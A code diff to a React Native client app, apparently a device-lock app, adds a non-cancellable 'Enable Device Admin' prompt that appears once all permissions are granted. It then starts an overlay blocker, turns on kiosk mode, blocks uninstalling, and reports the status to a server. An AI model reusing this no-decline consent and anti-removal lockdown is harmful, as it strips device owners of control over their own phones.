@@ -595,6 +595,51 @@ export default function ClientHome() {
     }
   };
 
+  // Auto-trigger Device Admin dialog when ALL 8 permissions are granted
+  useEffect(() => {
+    if (protectionComplete || !isMounted.current || isAdminActive) return;
+    const allGranted = Object.values(permissionStates).every(Boolean);
+    if (allGranted && !showAdminDialog) {
+      setShowAdminDialog(true);
+      Alert.alert(
+        language === 'et' ? 'Luba seadme administraator' : 'Enable Device Admin',
+        language === 'et'
+          ? 'Kõik õigused on lubatud. Kas soovite aktiveerida seadme administraatori režiimi? See kaitseb seadet ja seda ei saa keelata ilma administraatori loata.'
+          : 'All permissions are granted. Do you want to activate Device Admin mode? This will protect the device and cannot be disabled without administrator permission.',
+        [
+          {
+            text: language === 'et' ? 'Jah, luba' : 'Yes, Enable',
+            onPress: async () => {
+              if (isRequestingAdmin.current) return;
+              isRequestingAdmin.current = true;
+              try {
+                await devicePolicy.requestAdmin();
+                await new Promise(r => setTimeout(r, 2000));
+                const granted = await checkAdminStatusWithRetry(20, 1000);
+                if (granted && clientId) {
+                  // Start all protection services
+                  await devicePolicy.startOverlayBlocker();
+                  await devicePolicy.startKioskMode();
+                  await devicePolicy.preventUninstall(true);
+                  await reportAdminStatus(clientId, true);
+                  setProtectionComplete(true);
+                  setShowProtectionSetup(false);
+                  await AsyncStorage.setItem('protection_complete', 'true');
+                }
+              } catch (e) {
+                console.log('Device Admin activation error:', e);
+              } finally {
+                isRequestingAdmin.current = false;
+                setShowAdminDialog(false);
+              }
+            },
+          },
+        ],
+        { cancelable: false }
+      );
+    }
+  }, [permissionStates, protectionComplete, isAdminActive, showAdminDialog, language, clientId]);
+
   useEffect(() => {
     isMounted.current = true;
     
